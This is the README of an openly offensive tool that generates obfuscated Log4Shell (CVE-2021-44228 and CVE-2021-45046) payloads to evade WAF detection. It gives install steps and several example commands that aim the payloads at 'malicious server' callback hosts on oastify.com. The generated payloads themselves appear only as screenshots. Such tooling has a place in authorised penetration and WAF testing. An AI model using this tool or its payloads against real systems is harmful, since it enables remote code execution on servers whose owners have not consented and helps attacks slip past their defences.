# Log4Shell-obfuscated-payloads-generator
Log4Shell-obfuscated-payloads-generator can generate primary obfuscated or secondary obfuscated CVE-2021-44228 or CVE-2021-45046 payloads to evade WAF detection.

[The design idea of ​​Log4Shell-obfuscated-payloads-generator](https://r3kind1e.github.io/2022/05/26/Log4Shell-obfuscated-payloads-generator/)

## Installation
```
git clone https://github.com/r3kind1e/Log4Shell-obfuscated-payloads-generator.git
```

Log4Shell-obfuscated-payloads-generator works out of the box with Python version 3.x on any platform.

## Usage
To get a list of basic options use:

```
python3 Log4Shell-obfuscated-payloads-generator.py -h
```

To get usage examples use:

```
python3 Log4Shell-obfuscated-payloads-generator.py -hh
```

## Screenshots
`-h`: get a list of basic options
![help](img/help.png)

`-hh`: get usage examples
![usage-examples](img/usage-examples.png)

With a single option to generate payloads, the `-s` option specifies the malicious server:
```
--generate-primary-obfuscated-cve-2021-44228-payload 8 -s ck0pf4l6fmq4w0v17o7t894txk3arz.oastify.com
```
![primary44228](img/primary44228.png)
![burp-collaborator-client1](img/burp-collaborator-client1.png)

```
--generate-primary-obfuscated-cve-2021-45046-payload 4 -s x53a0p6r07bphlgms9setupei5owcl.oastify.com
```
![primary45046](img/primary45046.png)

```
--generate-secondary-obfuscated-cve-2021-44228-payload 5 -s oia1rpap41mhxkp6rdbbywit1k7avz.oastify.com
```
![secondary44228](img/secondary44228.png)
![burp-collaborator-client2](img/burp-collaborator-client2.png)

```
--generate-secondary-obfuscated-cve-2021-45046-payload 5 -s 3vzg44n4hgzwaz2l4soqbbv8ezkq8f.oastify.com
```
![secondary45046](img/secondary45046.png)

With multiple options to generate payloads, the `-s` option specifies a malicious server:
```
--generate-primary-obfuscated-cve-2021-44228-payload 4 --generate-secondary-obfuscated-cve-2021-44228-payload 4 -s exfr6fpfjr17ca4w63q1dmxjgam2ar.oastify.com
```
![primary44228secondary44228](img/primary44228secondary44228.png)

Without specifying a malicious server with the `-s` option, the `{{callback_host}}` placeholder will be preserved in the generated payloads:
```
--generate-primary-obfuscated-cve-2021-44228-payload 3
```
![primary44228-without-server](img/primary44228-without-server.png)
```
--generate-primary-obfuscated-cve-2021-45046-payload 3 --generate-secondary-obfuscated-cve-2021-45046-payload 7
```
![primary45046secondary45046](img/primary45046secondary45046.png)
